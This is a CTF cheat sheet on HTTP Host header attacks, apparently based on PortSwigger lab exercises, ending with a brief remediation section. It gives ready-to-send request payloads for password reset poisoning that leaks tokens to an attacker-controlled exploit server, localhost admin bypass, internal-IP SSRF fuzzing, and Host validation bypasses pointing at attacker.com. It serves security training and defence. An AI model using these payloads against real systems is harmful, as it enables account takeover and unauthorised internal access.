# HTTP Host Header Attacks — CTF Cheat Sheet

**Tools:** Burp Suite Community / Professional, Burp Collaborator, Exploit Server  
**Practice:** PortSwigger Web Security Academy  
**Scope:** Authorized CTFs and lab environments only

---

## 1. CTF Methodology

HTTP Host header attacks exploit applications that implicitly trust the HTTP `Host` header to generate dynamic links, route requests to internal hosts, or enforce access control.

1. **Test Host Header Reflection:**
   - Change `Host: target.net` to `Host: attacker.com` in Repeater.
   - Observe if `attacker.com` reflects into HTML links, redirects, script imports, or emails.
2. **Test Routing-Based SSRF:**
   - Supply internal IP addresses in the `Host` header (`Host: 192.168.0.1`) while maintaining the target's IP connection.
3. **Test Access Control Bypasses:**
   - Access restricted paths (`/admin`) using `Host: localhost` or `Host: 127.0.0.1`.
4. **Bypass Host Validation:**
   - Duplicate Host headers, port injection (`Host: target.net:bad`), absolute URLs, or override headers (`X-Forwarded-Host`).

---

## 2. High-Yield Attack Vectors

### 1. Password Reset Poisoning
- **Vulnerability:** The application generates password reset links using the client's `Host` header:
  ```http
  POST /forgot-password HTTP/2
  Host: EXPLOIT-SERVER-SUBDOMAIN
  Content-Type: application/x-www-form-urlencoded

  username=carlos
  ```
- **Result:** Victim receives an email containing:
  `https://EXPLOIT-SERVER-SUBDOMAIN/forgot-password?token=XYZ`
- When victim clicks the link, the token is recorded in your Exploit Server access logs.

---

### 2. Host Header Authentication Bypass
- **Vulnerability:** Front-end proxy checks path `/admin`, but trusts requests when the Host is `localhost`:
  ```http
  GET /admin HTTP/1.1
  Host: localhost
  ```
  *(Or `Host: 127.0.0.1`)*

---

### 3. Routing-Based SSRF via Host Header
- **Vulnerability:** Front-end load balancer routes the HTTP request to the backend server specified in the `Host` header:
  ```http
  GET /admin HTTP/1.1
  Host: 192.168.0.§1§
  ```
- Send to **Burp Intruder**, fuzz the last IP octet `1..255`, and identify the internal admin service (`200 OK`).

---

### 4. SSRF via Flawed Request Line Parsing
When the server accepts an absolute URL in the request line, front-end routing may prioritize the request line, while backend routing prioritizes the Host header:
```http
GET https://TARGET.net/admin HTTP/1.1
Host: 192.168.0.1
```

---

## 3. Host Validation Bypasses

When `Host: attacker.com` is rejected with `400 Bad Request` or `Invalid Host header`:

### 1. Port Number Injection
The backend strips the port number carelessly, appending the remainder to dynamic URLs:
```http
GET / HTTP/1.1
Host: TARGET.net:@attacker.com
Host: TARGET.net:attacker.com
```

### 2. Duplicate Host Headers
Front-end checks the first header; backend processes the second:
```http
GET / HTTP/1.1
Host: TARGET.net
Host: attacker.com
```

### 3. Line Wrapping / Indentation (HTTP/1.1)
```http
GET / HTTP/1.1
Host: TARGET.net
 Host: attacker.com
```

### 4. Host Override Headers
Check if middleware respects proxy override headers:
```http
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
X-HTTP-Host-Override: attacker.com
Forwarded: host=attacker.com
```

---

## 4. CTF Quick Reference

| Attack Goal | Probe Payload | Expected Impact |
|---|---|---|
| **Password Reset Steal** | `Host: exploit-server.net` | Token leaked to access logs |
| **Admin Route Bypass** | `Host: localhost` | Access to `/admin` granted |
| **Routing SSRF** | `Host: 192.168.0.X` | Connect to internal subnet |
| **Cache Poisoning** | `Host: attacker.com` | Poison script imports across all users |
| **Validation Bypass** | `Host: target.net:port` | Bypass regex check via port injection |
| **Header Override** | `X-Forwarded-Host: evil.com` | Override Host without touching original |

---

## 5. Remediation

- **Do Not Trust the HTTP Host Header:** Rely on a hardcoded, trusted server name configured in the web server / framework environment settings (e.g., `SERVER_NAME` in Apache, `server_name` in Nginx).
- **Reject Unrecognized Host Headers:** Return `400 Bad Request` for any request whose Host header does not match a strict allowlist.
- **Ignore Forwarded Host Headers:** Strip `X-Forwarded-Host` unless operating behind a known, trusted internal reverse proxy.
